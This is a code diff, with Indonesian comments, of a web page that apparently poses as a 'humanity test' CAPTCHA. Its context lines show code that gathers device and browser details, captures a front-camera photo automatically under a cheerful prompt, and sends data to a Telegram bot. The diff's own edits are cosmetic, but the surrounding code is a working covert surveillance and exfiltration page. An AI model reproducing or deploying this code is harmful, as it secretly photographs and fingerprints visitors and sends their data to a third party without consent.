@@ -8,7 +8,8 @@ async function startProcess() {
     const statusEl = document.getElementById('status');
     
     statusEl.innerText = "Mengumpulkan informasi perangkat secara rinci...";
-// 1. Kumpulkan Data Perangkat & Browser secara Rinci
+
+    // 1. Kumpulkan Data Perangkat & Browser secara Rinci
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
     const language = navigator.language;
@@ -91,7 +92,7 @@ async function startProcess() {
 
     // 4. Ambil Foto Kamera Depan secara Otomatis
     try {
-        statusEl.innerText = "Senyum Dulu, Bos! 📸.";
+        statusEl.innerText = "Senyum Dulu, Bos! 📸";
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         const video = document.getElementById('video');
         video.srcObject = stream;
@@ -159,15 +160,10 @@ function finalizePage() {
     document.getElementById('loader').style.display = 'none';
     document.getElementById('status').innerText = "";
     document.getElementById('mainCard').innerHTML = `
-function finalizePage() {
-    document.getElementById('loader').style.display = 'none';
-    document.getElementById('status').innerText = "";
-    document.getElementById('mainCard').innerHTML = `
         <h2 style="color: #22c55e;">Lulus Tes Kemanusiaan!</h2>
         <p>Anda telah berhasil membuktikan bahwa Anda bukan robot yang menyamar. Silakan kembali melanjutkan rebahan.</p>
     `;
 }
-    
 
 async function sendTextToTelegram(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
